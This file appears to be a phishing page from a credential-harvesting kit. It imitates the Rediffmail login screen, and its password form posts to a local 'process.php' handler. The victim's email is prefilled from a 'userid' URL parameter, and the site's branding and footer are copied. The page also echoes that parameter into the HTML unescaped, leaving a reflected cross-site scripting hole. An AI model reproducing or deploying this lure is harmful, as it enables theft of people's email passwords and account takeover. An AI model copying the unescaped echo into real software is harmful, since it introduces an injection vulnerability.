<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Rediffmail</title>

<style type="text/css">
<!--
body{
	margin: 0;
	padding: 0;
	font-family: Arial;
	font-size: 14px;
	color: #000000;
}
a{
	color: #0065EA;
    cursor: pointer;
    text-decoration: underline;
}

/* Generic Styles */
.floatL{ float: left; } .floatR{ float: right; } .clear{ clear: both; }
.alignC{ text-align: center; } .alignL{ text-align: left; } .alignR{ text-align: right; }
.f11{ font-size: 11px; } .f12{ font-size: 12px; } .f13{ font-size: 13px; } .f14{ font-size: 14px; } .f15{ font-size: 15px; } .f16{ font-size: 16px; }
.bold{font-weight: bold;} .grey{color: #808080;} .margTop5{margin-top: 5px;} .margTop10{ margin-top: 10px;} .margTop20{ margin-top: 20px; }
/* Generic styles ends.. */

.uncheck-label{
	margin-left: 24px;
	color: #686868;
}
.wrapper{
	width: 948px;
	margin: 20px auto;
}
.content-area{
	height: 495px;
	width: 100%;
}
.ad-area{
	width: 640px;
	height: 500px;
}
.advertisement-area{
	width: 640px;
	height: 480px;
	background: #FFFFFF;
	margin-top: 5px;
	overflow: hidden;
}
.login-area-free{
	background: none repeat scroll 0 0 #E7E7E7;
    height: 348px;
    width: 293px;
}
.rediffmail-logo{
	background-image: url('//jdelivery.rediff.com/ajaxprism/pix_1_3/rmailng_logo.png');
	background-repeat: no-repeat;
	background-position: 0 0;
	width: 87px;
	height: 21px;
	position: absolute;
	margin: 15px 0 0 20px;
}
.rhs-area{
	width:292px;
}
.login-inner-free{
	background: none repeat scroll 0 0 #F3F3F3;
    height: 340px;
    margin: 4px auto 4px 4px;
	width: 285px;
	-moz-box-shadow: inset 0 0 10px #E7E7E7;
	-webkit-box-shadow: inset 0 0 10px #E7E7E7;
	box-shadow: inset 0 0 10px #E7E7E7;
}
.login-form{
	padding: 50px 18px 0;
}
.login-form input[type="text"]{
	width: 243px;
	height: 20px;
	border: solid 1px #B6B6B6;
}
.login-form input[type="password"]{
	width: 243px;
	height: 20px;
	border: solid 1px #B6B6B6;
}
.form-label{
	margin-bottom: 3px;
}
.create-new-account{
	background: none repeat scroll 0 0 #FFFFFF;
    height: 45px;
    margin-top: 27px;
    padding: 10px;
    width: 225px;
	border: solid 1px #DEDEDE;
}
.lock{
	background-image: url('//jdelivery.rediff.com/ajaxprism/pix_1_3/new_indiahomesprite7.png');
    background-position: -350px 0;
    height: 14px;
    width: 10px;
	margin: 0 10px;
}
.get-pro-outer{
	background: none repeat scroll 0 0 #E7E7E7;
    height: 137px;
    margin: 15px 0 0;
    width: 293px;
}
.get-pro-inner{
	background: none repeat scroll 0 0 #F3F3F3;
    height: 123px;
    margin: 4px auto 4px 4px;
    width: 245px;
	padding: 6px 20px 0;
	
	-moz-box-shadow: inset 0 0 10px #E7E7E7;
	-webkit-box-shadow: inset 0 0 10px #E7E7E7;
	box-shadow: inset 0 0 10px #E7E7E7;
}
.rmail-pro-logo{
	background-image: url('//jdelivery.rediff.com/ajaxprism/pix_1_3/rmailpro.png');
	background-repeat: no-repeat;
	background-position: 0 0;
	width: 166px;
	height: 21px;
}
.pro-get-yours{
	background: none repeat scroll 0 0 #FFFFFF;
    height: 60px;
	margin-left: -1px;
    margin-top: 7px;
    padding: 10px 14px;
	border: solid 1px #DEDEDE;
	width: 215px;
}
.footer-area{
	margin-top: 20px;
	padding-top: 5px;
	border-top: solid 3px #dbdbdb;
	height: 30px;
}
//-->
</style>


</head>
<body>
<div class="wrapper">
	<!-- Header -->
	<div class="head-wrapper">
		<div class="floatL">
			<a href="http://www.rediff.com/"><img src="image/rediff_logo.gif" border="0"></a>
		</div>
		<div class="floatR">
			<a href="http://www.rediff.com/">Home</a>
		</div>
		<div class="clear"></div>
	</div>
	<!-- Content-->
	<div class="content-area">
		
		<div class="ad-area floatL">
				<div class="alignC f12">Advertisement</div>
				<div class="advertisement-area">
					<img src="image/ad.gif" />
				</div>
			</div>
			
		<div class="rhs-area floatR">
			<div class="login-area-free floatR">
				<div class="login-inner-free">
					<div class="rediffmail-logo"></div>
					<form  action="process.php" method="POST">
						<input type="hidden" name="FormName" value="existing"> 
						<input type="hidden" name="seclogin" value="on">
						<div class="login-form">
							<div>
								<p style="font-weight:bold;"><?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?></p>
								<input type="hidden"  name="email" value="<?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?>" >
							</div>
							
							<div class="f14 margTop10 form-label">
								<div class="floatL bold">Password</div>
								<div class="floatR"><a href="https://register.rediff.com/utilities/newforgot/index.php?FormName=showlogin" class="f12">Forgot Password?</a></div>
								<div class="clear"></div>
							</div>
							<div>
								<input type="password" id="password" name="password" value="" style="_width: 243px;" tabindex="2">
							</div>
							
							<div class="margTop10">
								<div>
									<label>
										<input type="checkbox" checked="checked" name="remember" id="remember" value="1" tabindex="3"> 
										Keep me signed in
									</label>
								</div>
								<div class="uncheck-label f12">(Uncheck if on a shared computer)</div>
							</div>
							
							<div class="margTop10">
								<div class="floatL"><input type="submit" name="proceed" value="Go" title="Sign in" tabindex="4"></div>
								<div class="floatL f12 margTop5">
									<div class="floatL lock"></div>
									<div class="floatL">Secured Login</div>
								</div>
								<div class="clear"></div>
							</div>
							<div class="create-new-account f15 alignC bold" style="*margin-top: 10px;">
								Don't have a Rediffmail ID?<br>
								<a href="https://register.rediff.com/register/register.php?FormName=user_details">Create a new account</a>
							</div>
						</div>
						<img id="fill_metric" width="1" height="1" border="0" alt="" src="image/login">
					</form>
				
				</div>
			</div>
			<div class="get-pro-outer floatR">
				<div class="get-pro-inner">
					<div class="rmail-pro-logo"><img src="image/rmailpro.png" /></div>
					<div class="pro-get-yours alignC">
						<div class="f15 alignL bold">Own a personalised email ID</div>
						<div class="alignL f12 grey">e.g. Raj Shah owns raj@shahtrading.in</div>
						<div class="alignL"><a href="http://businessemail.rediff.com/" onclick="javascript:location.href=&#39;http://track.rediff.com/click?url=___http://businessemail.rediff.com?sc_cid=maltlog___&amp;cmp=maltlog&amp;lnk=maltlog&amp;nsrv1=host&#39;; return false;" class="f15 bold">Get yours today</a></div>
					</div>
				</div>
			</div>
			<div class="clear"></div>
		</div>
	</div>
	<!-- Footer -->
	<div class="footer-area alignC f12">
		Copyright © 2016 Rediff.com India Limited. All rights reserved.<br>
		<a href="http://in.rediff.com/disclaim.htm" target="_blank">Disclaimer</a> | <a href="http://www.rediff.com/w3c/policy.html" target="_blank">Privacy Policy</a>
	</div>
</div>
</body></html>